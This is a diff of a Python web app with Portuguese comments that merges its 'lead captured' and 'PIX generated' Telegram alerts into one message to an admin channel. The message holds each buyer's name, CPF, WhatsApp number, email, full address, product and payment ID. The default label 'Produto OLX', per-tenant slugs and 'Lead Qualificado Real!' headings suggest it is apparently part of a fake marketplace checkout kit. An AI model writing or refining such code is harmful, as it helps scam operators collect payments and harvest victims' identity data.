@@ -5137,25 +5137,8 @@ def capture_lead():
             tg_wh.log_tenant_event(t_id, slug, "LEAD_CAPTURED", sid, ip, lead_payload)
             tg_wh.log_tenant_event(t_id, slug, "LEAD_PENDING", sid, ip, lead_payload)
 
-        # Envia notificacao completa ao canal de leads
-        lead_html = (
-            f"<b>📝 Lead Qualificado Real!</b>\n"
-            f"👤 <b>Nome:</b> {name}\n"
-            f"📱 <b>WhatsApp:</b> <code>{phone}</code>\n"
-            f"📄 <b>CPF:</b> <code>{cpf}</code>\n"
-            f"📧 <b>Email:</b> {email or 'Não informado'}\n"
-            f"🏠 <b>Endereço:</b> {street}, Nº {number_addr} - {neighborhood}, {city}/{state} (CEP: {cep})\n"
-            f"📦 <b>Produto:</b> {lead_payload.get('product', 'Produto OLX')}\n"
-            f"💰 <b>Valor:</b> R$ {amount}\n"
-            f"🔗 <b>Slug:</b> <code>{slug or 'principal'}</code>\n"
-            f"⏱ <b>Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
-        )
-        wa_digits = re.sub(r'\D', '', str(phone))
-        lead_kb = None
-        if len(wa_digits) >= 10:
-            wa_num = wa_digits if wa_digits.startswith("55") else f"55{wa_digits}"
-            lead_kb = {"inline_keyboard": [[{"text": "💬 Chamar no WhatsApp", "url": f"https://wa.me/{wa_num}"}]]}
-        tg_wh.notify_log_channel("lead", lead_html, markup=lead_kb)
+        # Lead registrado — notificacao unificada sera enviada junto com o PIX gerado
+        # (evita duplicidade: lead + pix geram a mesma mensagem para o admin)
 
     return jsonify({
         "ok": True,
@@ -5590,18 +5573,35 @@ def generate_pix():
         tg_wh.log_tenant_event(tg_id_for_price, slug_for_price, "PIX_GENERATED", sid, _user_ip(), pix_log_payload)
 
         wa_digits = re.sub(r'\D', '', str(clean_phone))
-        wa_str = f"📱 <b>WhatsApp:</b> <code>{clean_phone}</code>\n" if clean_phone else ""
-        dest_str = f"📍 <b>Destino:</b> {city}/{state}\n" if (city or state) else ""
 
+        # Formata valor monetário
+        try:
+            amt_fmt = f"{c7_amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
+        except Exception:
+            amt_fmt = str(c7_amount)
+
+        # Endereço completo
+        addr_parts = []
+        if street:       addr_parts.append(f"{street}" + (f", Nº {number_addr}" if number_addr else ""))
+        if complement:   addr_parts.append(f"Compl: {complement}")
+        if neighborhood: addr_parts.append(f"{neighborhood}")
+        if city or state: addr_parts.append(f"{city}/{state}" if (city and state) else city or state)
+        if cep:          addr_parts.append(f"CEP: {cep}")
+        addr_line = " • ".join(addr_parts) if addr_parts else "Não informado"
+
+        # Mensagem unificada Lead + PIX (uma única notificação ao admin)
         pix_msg = (
-            f"<b>💸 Pix Gerado para Pagamento!</b>\n"
-            f"📦 <b>Produto:</b> {prod_title}\n"
-            f"👤 <b>Cliente:</b> {payer_name}\n"
+            f"<b>🧾 Lead + PIX Gerado!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>Nome:</b> {payer_name}\n"
             f"📄 <b>CPF:</b> <code>{payer_document}</code>\n"
-            f"{wa_str}"
-            f"{dest_str}"
-            f"💰 <b>Valor Pix:</b> R$ {c7_amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".") + f"\n"
-            f"🆔 <b>ID:</b> <code>{payment_id}</code>\n"
+            f"📱 <b>WhatsApp:</b> <code>{clean_phone or 'Não informado'}</code>\n"
+            f"📧 <b>Email:</b> {clean_email or 'Não informado'}\n"
+            f"🏠 <b>Endereço:</b> {addr_line}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"📦 <b>Produto:</b> {prod_title}\n"
+            f"💰 <b>Valor Pix:</b> R$ {amt_fmt}\n"
+            f"🆔 <b>ID Pagamento:</b> <code>{payment_id}</code>\n"
             f"🔗 <b>Slug:</b> <code>{slug_for_price}</code>\n"
             f"⏱ <b>Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
         )
